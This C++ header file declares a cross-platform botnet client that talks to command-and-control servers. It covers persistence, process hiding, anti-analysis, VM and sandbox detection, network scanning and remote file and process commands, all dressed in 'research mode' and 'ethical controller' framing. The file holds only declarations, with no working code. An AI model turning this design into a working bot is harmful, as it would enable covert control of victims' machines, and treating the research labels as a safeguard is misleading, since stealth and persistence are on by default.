#pragma once

#include <memory>
#include <string>
#include <chrono>
#include <map>
#include <vector>
#include <functional>
#include <atomic>
#include <mutex>
#include <thread>
#include <boost/asio.hpp>

// Single codebase - no platform-specific includes here
#include "../../common/utils/platform_utils.h"
#include "../../common/protocol/message.h"
#include "../../common/protocol/packet_handler.h"
#include "../../common/crypto/encryption.h"

namespace botnet {
namespace client {

/**
 * @brief Main bot client class - single codebase for all platforms
 * 
 * This is the core bot implementation that works identically on
 * Windows, Linux, and macOS using standard C++ and platform abstraction.
 */
class BotClient {
public:
    enum class State {
        UNINITIALIZED,
        INITIALIZING,
        CONNECTING,
        CONNECTED,
        RUNNING,
        SHUTTING_DOWN,
        SHUTDOWN,
        ERROR_STATE
    };

    struct Configuration {
        // C2 Server settings
        std::vector<std::string> c2_endpoints;
        std::string client_id;
        std::chrono::seconds heartbeat_interval{60};
        std::chrono::seconds reconnect_interval{30};
        uint32_t max_reconnect_attempts{10};
        
        // Persistence settings
        bool enable_persistence{true};
        bool enable_autostart{true};
        std::string install_location;
        
        // Stealth settings
        bool enable_stealth{true};
        bool hide_from_process_list{false};  // Disabled in research mode
        bool anti_analysis{false};           // Disabled in research mode
        
        // Research settings
        bool research_mode{true};            // Always enabled for our use case
        std::string research_session_id;
        std::string compliance_token;
        std::vector<std::string> allowed_commands;
        
        // Security settings
        std::string encryption_key;
        std::string rsa_private_key;
        std::string c2_public_key;
        bool verify_c2_certificate{true};
        
        // Operational settings
        std::chrono::hours max_runtime{24};  // Safety limit
        std::string log_level{"INFO"};
        bool enable_local_logging{true};
    };

public:
    explicit BotClient(boost::asio::io_context& io_context);
    ~BotClient();

    // Core lifecycle
    bool Initialize(const Configuration& config);
    void Run();
    void Shutdown();
    void EmergencyStop(const std::string& reason);

    // State management
    State GetState() const;
    bool IsRunning() const;
    bool IsConnected() const;
    
    // Configuration
    const Configuration& GetConfiguration() const;
    bool UpdateConfiguration(const Configuration& new_config);
    
    // Statistics
    struct Statistics {
        std::chrono::system_clock::time_point start_time;
        std::chrono::system_clock::time_point last_c2_contact;
        uint32_t messages_sent;
        uint32_t messages_received;
        uint32_t commands_executed;
        uint64_t bytes_sent;
        uint64_t bytes_received;
        uint32_t reconnection_attempts;
        std::string current_c2_endpoint;
        bool research_mode_active;
    };
    
    Statistics GetStatistics() const;
    void ResetStatistics();

    // Research interface
    void EnableResearchMode(const std::string& session_id, const std::string& compliance_token);
    void DisableResearchMode();
    std::vector<std::string> GetResearchLogs() const;
    void SetResearchLimitations(const std::vector<std::string>& allowed_commands);

private:
    // Forward declarations for internal components
    class CommunicationManager;
    class PersistenceManager;
    class StealthManager;
    class CommandProcessor;
    class ConfigurationManager;
    class EthicalController;

    boost::asio::io_context& io_context_;
    
    // Core components
    std::unique_ptr<CommunicationManager> comm_manager_;
    std::unique_ptr<PersistenceManager> persistence_manager_;
    std::unique_ptr<StealthManager> stealth_manager_;
    std::unique_ptr<CommandProcessor> command_processor_;
    std::unique_ptr<ConfigurationManager> config_manager_;
    std::unique_ptr<EthicalController> ethical_controller_;
    
    // State and configuration
    std::atomic<State> state_;
    Configuration config_;
    mutable std::mutex config_mutex_;
    
    // Statistics
    mutable std::mutex stats_mutex_;
    Statistics stats_;
    
    // Runtime management
    std::unique_ptr<std::thread> main_thread_;
    std::unique_ptr<boost::asio::steady_timer> heartbeat_timer_;
    std::unique_ptr<boost::asio::steady_timer> runtime_limit_timer_;
    
    // Research and safety
    std::atomic<bool> emergency_stop_triggered_;
    std::string emergency_stop_reason_;
    mutable std::vector<std::string> research_logs_;
    mutable std::mutex research_logs_mutex_;
    
    // Internal methods
    void SetState(State new_state);
    void MainLoop();
    void HandleHeartbeat();
    void HandleRuntimeLimit();
    void LogResearchActivity(const std::string& activity);
    
    // Component initialization
    bool InitializeCommunication();
    bool InitializePersistence();
    bool InitializeStealth();
    bool InitializeCommandProcessor();
    bool InitializeEthicalController();
    
    // Cleanup
    void CleanupResources();
};

/**
 * @brief Communication manager for C2 server interaction
 */
class BotClient::CommunicationManager {
public:
    explicit CommunicationManager(boost::asio::io_context& io_context, BotClient& parent);
    ~CommunicationManager();

    bool Initialize(const Configuration& config);
    bool Connect();
    void Disconnect();
    bool IsConnected() const;
    
    bool SendHeartbeat();
    bool SendMessage(std::unique_ptr<protocol::Message> message);
    
    void SetMessageCallback(std::function<void(std::unique_ptr<protocol::Message>)> callback);
    void SetConnectionCallback(std::function<void(bool)> callback);
    void SetErrorCallback(std::function<void(const std::string&)> callback);

private:
    boost::asio::io_context& io_context_;
    BotClient& parent_;
    
    std::unique_ptr<protocol::ConnectionManager> connection_manager_;
    std::unique_ptr<crypto::AESEncryption> encryption_;
    std::unique_ptr<crypto::RSAKeyPair> client_keys_;
    std::unique_ptr<crypto::RSAKeyPair> c2_public_key_;
    
    Configuration config_;
    bool connected_;
    
    void HandleMessage(std::unique_ptr<protocol::Message> message);
    void HandleConnectionChange(bool connected);
    void HandleError(const std::string& error);
    
    bool PerformHandshake();
    bool AuthenticateWithC2();
};

/**
 * @brief Cross-platform persistence manager
 */
class BotClient::PersistenceManager {
public:
    explicit PersistenceManager(BotClient& parent);
    ~PersistenceManager();

    bool Initialize(const Configuration& config);
    bool InstallPersistence();
    bool RemovePersistence();
    bool IsInstalled() const;
    
    std::string GetInstallLocation() const;
    bool UpdateInstallation();

private:
    BotClient& parent_;
    Configuration config_;
    std::string install_location_;
    bool installed_;
    
    // Cross-platform persistence methods
    bool InstallAutostartPersistence();
    bool InstallServicePersistence();
    bool InstallScheduledTaskPersistence();
    
    bool RemoveAutostartPersistence();
    bool RemoveServicePersistence();
    bool RemoveScheduledTaskPersistence();
    
    // Platform-specific implementations using abstraction layer
    bool CreateWindowsPersistence();
    bool CreateLinuxPersistence();
    bool CreateMacOSPersistence();
    
    // Research mode persistence (clearly marked)
    bool CreateResearchPersistence();
    void MarkAsResearchInstallation();
};

/**
 * @brief Cross-platform stealth manager
 */
class BotClient::StealthManager {
public:
    explicit StealthManager(BotClient& parent);
    ~StealthManager();

    bool Initialize(const Configuration& config);
    bool EnableStealth();
    bool DisableStealth();
    bool IsStealthEnabled() const;
    
    // Process hiding (disabled in research mode)
    bool HideProcess();
    bool UnhideProcess();
    
    // Anti-analysis (disabled in research mode)
    bool EnableAntiAnalysis();
    bool DisableAntiAnalysis();
    
    // VM detection
    bool IsRunningInVirtualMachine() const;
    bool IsRunningInSandbox() const;
    
    // Research mode stealth (clearly identified)
    bool EnableResearchStealth();
    void MarkProcessAsResearch();

private:
    BotClient& parent_;
    Configuration config_;
    bool stealth_enabled_;
    bool process_hidden_;
    
    // Cross-platform stealth implementations
    bool HideFromProcessListWindows();
    bool HideFromProcessListLinux();
    bool HideFromProcessListMacOS();
    
    // VM/Sandbox detection using platform utils
    bool DetectVMWare() const;
    bool DetectVirtualBox() const;
    bool DetectHyperV() const;
    bool DetectSandboxEnvironment() const;
    
    // Research mode markers
    void AddResearchIdentifiers();
    void SetResearchProcessName();
};

/**
 * @brief Command processor for executing C2 commands
 */
class BotClient::CommandProcessor {
public:
    using CommandHandler = std::function<nlohmann::json(const nlohmann::json&)>;

    explicit CommandProcessor(BotClient& parent);
    ~CommandProcessor();

    bool Initialize(const Configuration& config);
    
    nlohmann::json ProcessCommand(const protocol::CommandRequest& command);
    void RegisterCommandHandler(const std::string& command_type, CommandHandler handler);
    
    // Built-in command handlers
    nlohmann::json HandleSystemInfo(const nlohmann::json& params);
    nlohmann::json HandleNetworkScan(const nlohmann::json& params);
    nlohmann::json HandleFileOperation(const nlohmann::json& params);
    nlohmann::json HandleProcessOperation(const nlohmann::json& params);
    nlohmann::json HandleResearchOperation(const nlohmann::json& params);
    
    // Research-specific commands
    nlohmann::json HandleResearchDataCollection(const nlohmann::json& params);
    nlohmann::json HandleResearchLogging(const nlohmann::json& params);
    
    // Safety commands
    nlohmann::json HandleEmergencyStop(const nlohmann::json& params);
    nlohmann::json HandleHealthCheck(const nlohmann::json& params);

private:
    BotClient& parent_;
    Configuration config_;
    std::map<std::string, CommandHandler> command_handlers_;
    mutable std::mutex handlers_mutex_;
    
    void InitializeBuiltinHandlers();
    bool IsCommandAllowed(const std::string& command_type) const;
    bool ValidateCommandParameters(const std::string& command_type, const nlohmann::json& params) const;
    
    void LogCommandExecution(const std::string& command_type, const nlohmann::json& params);
};

/**
 * @brief Configuration manager for runtime configuration
 */
class BotClient::ConfigurationManager {
public:
    explicit ConfigurationManager(BotClient& parent);
    ~ConfigurationManager();

    bool LoadConfiguration(const std::string& config_file);
    bool SaveConfiguration(const std::string& config_file) const;
    
    Configuration GetDefaultConfiguration() const;
    bool ValidateConfiguration(const Configuration& config) const;
    
    // Dynamic configuration updates
    bool UpdateEndpoints(const std::vector<std::string>& new_endpoints);
    bool UpdateHeartbeatInterval(std::chrono::seconds interval);
    bool UpdateResearchSettings(const std::string& session_id, const std::string& token);

private:
    BotClient& parent_;
    
    std::string GetDefaultConfigPath() const;
    nlohmann::json SerializeConfiguration(const Configuration& config) const;
    Configuration DeserializeConfiguration(const nlohmann::json& json) const;
    
    // Platform-specific config locations
    std::string GetWindowsConfigPath() const;
    std::string GetLinuxConfigPath() const;
    std::string GetMacOSConfigPath() const;
};

/**
 * @brief Ethical controller for research compliance
 */
class BotClient::EthicalController {
public:
    explicit EthicalController(BotClient& parent);
    ~EthicalController();

    bool Initialize(const Configuration& config);
    
    // Command validation
    bool ValidateCommand(const protocol::CommandRequest& command) const;
    bool IsCommandEthicallyApproved(const std::string& command_type) const;
    
    // Research boundaries
    bool CheckGeographicCompliance() const;
    bool CheckTimeRestrictions() const;
    bool CheckResearchLimits() const;
    
    // Safety mechanisms
    void TriggerEmergencyStop(const std::string& reason);
    bool IsEmergencyStopTriggered() const;
    
    // Compliance logging
    void LogEthicalEvent(const std::string& event_type, const std::string& description);
    std::vector<std::string> GetComplianceLog() const;
    
    // Research session management
    bool ValidateResearchSession(const std::string& session_id, const std::string& token) const;
    void UpdateResearchConstraints(const std::vector<std::string>& allowed_commands);

private:
    BotClient& parent_;
    Configuration config_;
    
    // Ethical constraints
    std::vector<std::string> allowed_commands_;
    std::vector<std::string> blocked_commands_;
    std::map<std::string, std::string> geographic_restrictions_;
    
    // Compliance tracking
    mutable std::vector<std::string> compliance_log_;
    mutable std::mutex compliance_mutex_;
    
    // Safety state
    std::atomic<bool> emergency_stop_triggered_;
    std::string emergency_stop_reason_;
    
    // Validation methods
    bool ValidateCommandParameters(const protocol::CommandRequest& command) const;
    bool IsDestructiveCommand(const std::string& command_type) const;
    bool IsDataExfiltrationCommand(const std::string& command_type) const;
    
    // Geographic compliance
    std::string GetCurrentCountryCode() const;
    bool IsLocationAllowed(const std::string& country_code) const;
    
    // Time restrictions
    bool IsWithinAllowedTimeWindow() const;
    bool IsBusinessHours() const;
};

} // namespace client
} // namespace botnet
